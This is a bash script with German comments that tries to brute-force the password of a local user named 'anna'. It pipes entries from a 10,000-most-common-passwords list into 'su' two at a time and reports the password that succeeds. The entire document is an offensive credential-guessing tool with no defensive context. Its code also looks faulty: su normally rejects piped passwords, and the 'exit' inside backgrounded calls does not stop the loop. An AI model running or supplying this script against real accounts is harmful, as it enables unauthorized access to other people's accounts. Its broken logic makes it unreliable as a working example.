#!/bin/bash

# Pfad zur Datei mit den 10.000 häufigsten Passwörtern
password_list_path="./10k-most-common.txt"

# Benutzername, für den das Passwort getestet werden soll
username="anna"

# Funktion, um Passwörter zu testen
check_password() {
    local password="$1"
    su - "$username" -c "whoami" <<< "$password" > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo "Erfolgreich angemeldet als '$username' mit dem Passwort '$password'"
        exit 0
    else
        echo "Fehler beim Anmelden als '$username' mit dem Passwort '$password'"
    fi
}

# Starte zwei gleichzeitige Subprozesse, um Passwörter zu testen
while IFS= read -r password1 && IFS= read -r password2; do
    check_password "$password1" &
    check_password "$password2" &
    wait
done < "$password_list_path"

# Wenn kein gültiges Passwort gefunden wurde
echo "Kein gültiges Passwort für '$username' gefunden."
exit 1
